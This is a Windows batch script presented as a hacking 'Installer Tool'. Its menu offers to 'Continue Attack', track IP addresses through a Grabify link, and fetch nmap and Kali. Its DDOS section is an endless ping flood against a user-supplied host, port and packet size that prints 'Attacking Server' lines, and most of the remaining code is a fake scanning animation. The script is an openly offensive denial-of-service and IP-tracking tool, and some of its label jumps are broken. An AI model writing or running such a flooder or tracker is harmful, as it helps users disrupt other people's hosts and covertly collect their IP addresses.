@echo off
chcp 65001 >nul
title Installer Tool - By Frnaxx
color 0a
cls
goto NEXT

:NEXT     
echo.
type "banner - App.txt"
echo.
echo Choice :
echo.
echo      ----------------------------
echo.
echo        1) Check Target Connection
echo        2) Continue Attack
echo        3) Tracking IP by sending link
echo        4) Zenmap / Nmap Download 
echo        5) NSLookup Target
echo.
echo      ----------------------------
echo.
echo        6) Download Kali Linux Virtual Box
echo        7) Download Wireshark
echo        8) Download Virtual Box
echo.
echo      ----------------------------
echo.
echo        0) back to menu 
echo      Note : To stop the attack press CTRL + C
echo.
set/p "input=Input Option:"
echo.
if %input%==1 goto check_connection
if %input%==2 goto continue
if %input%==3 start https://www.grabify.link
if %input%==4 goto nmap
if %input%==5 goto nslookup
if %input%==6 goto kali
if %input%==7 goto wireshark
if %input%==8 goto vb
if %input%==0 goto out

echo.

:check_connection
cls
echo [==================================]
echo [--------- Host Target : ----------]
echo [==================================]
echo.
set /p x=Host Target:
ping %x% -n 1 >nul
if errorlevel 1 (
    echo Target is Offline
    ping localhost -n 1 >nul 
    echo Target is Offline
    ping localhost -n 1 >nul 
    echo Target is Offline
    ping %x% -n 2
) else (
    echo Target is Online
    ping localhost -n 1 >nul 
    echo Target is Online
    ping localhost -n 1 >nul 
    echo Target is Online
    ping %x% -n 1
)

goto continue

:out
set /p confirmation1=Are you sure you want to exit this program? (y/n) :
if %confirmation1%==y goto :start
if %confirmation1%==n goto :rest

:rest
start discord_main.bat
cls
exit

:nslookup
cls
SET TYPE=MX
echo [==================================]
echo [--------- Host Target : ----------]
echo [==================================]
echo.
set /p lookup=IP Address / Website to lookup: 
nslookup %lookup%
pause
goto NEXT

:kali
start https://www.kali.org/get-kali/#kali-virtual-machines
pause
goto NEXT

:wireshark
start https://www.wireshark.org/download.html
pause
goto NEXT

:vb
start https://www.virtualbox.org/wiki/Downloads
pause
goto NEXT

:continue
cls
echo [==================================]
echo [---- Input IP / Host Target : ----]
echo [==================================]
echo.
set /p m=ip Host:
echo.
echo [==================================]
echo [---------- Input Port : ----------]
echo [==================================]
echo.
set /p p=port:
echo.
echo.
echo [==========================================================]
echo [-- Enter Packet / Packet Size to attack %m% : --]
echo [==========================================================]
echo.
set /p n=Packet Size:
echo.
:confirmation
set /p confirmation=Are you sure you want to continue (Y/N) ?
:scan
echo S
ping localhost -n 1 >nul
cls
echo Sc
ping localhost -n 1 >nul
cls
echo Sca
ping localhost -n 1 >nul
cls
echo Scan
ping localhost -n 1 >nul
cls
echo Scann
ping localhost -n 1 >nul
cls
echo Scanni
ping localhost -n 1 >nul
cls
echo Scannin 
ping localhost -n 1 >nul
cls
echo Scanning 
ping localhost -n 1 >nul
cls
echo Scanning S
ping localhost -n 1 >nul
cls
echo Scanning Se
ping localhost -n 1 >nul
cls
echo Scanning Ser
ping localhost -n 1 >nul
cls
echo Scanning Serv
ping localhost -n 1 >nul
cls
echo Scanning Serve
ping localhost -n 1 >nul
cls
echo Scanning Server
ping localhost -n 1 >nul
cls
echo Scanning Server.
ping localhost -n 1 >nul
cls
echo Scanning Server..
ping localhost -n 1 >nul
cls
echo Scanning Server...
ping localhost -n 1 >nul
cls
echo Scanning Server....
ping localhost -n 2 >nul
cls
echo Scanning Server...
ping localhost -n 1 >nul
cls
echo Scanning Server..
ping localhost -n 1 >nul
cls
echo Scanning Server.
ping localhost -n 1 >nul
cls
echo Scanning Server
ping localhost -n 1 >nul
cls
echo Scanning Serve
ping localhost -n 1 >nul
cls
echo Scanning Serv
ping localhost -n 1 >nul
cls
echo Scanning Ser
ping localhost -n 1 >nul
cls
echo Scanning Se
ping localhost -n 1 >nul
cls
echo Scanning S
ping localhost -n 1 >nul
cls
echo Scanning 
ping localhost -n 1 >nul
cls
echo Scanning
ping localhost -n 1 >nul
cls
echo Scannin
ping localhost -n 1 >nul
cls
echo Scanni
ping localhost -n 1 >nul
cls
echo Scann
ping localhost -n 1 >nul
cls
echo Scan
ping localhost -n 1 >nul
cls
echo Sca
ping localhost -n 1 >nul
cls
echo Sc
ping localhost -n 1 >nul
cls
echo S
ping localhost -n 1 >nul
cls
if %confirmation%==y goto :DDOS
if %confirmation%==n goto :NEXT
 
:nmap
cls
echo install nmap
powershell -Command "Invoke-WebRequest https://nmap.org/dist/nmap-7.80-setup.exe -OutFile nmap-7.80-setup.exe"
start nmap-7.80-setup.exe
echo type nmap to use
pause
goto start

:DDOS
cls
@REM ping -n 1 %m% -l %n% | FIND "TTL="
@REM IF ERRORLEVEL 1 (SET in=c & echo No connection, server maybe down.)
@REM color %in%
@REM ping -t 2 0 10 127.0.0.1 >nul
ping %m% -l %n% -n 1 >nul
if errorlevel 1 (
    echo No Connection, Server maybe down
) else (
   echo [%date%] [%time%] Attacking Server %m% {sent %n%}           {--sent %n% #success--}
)
goto DDOS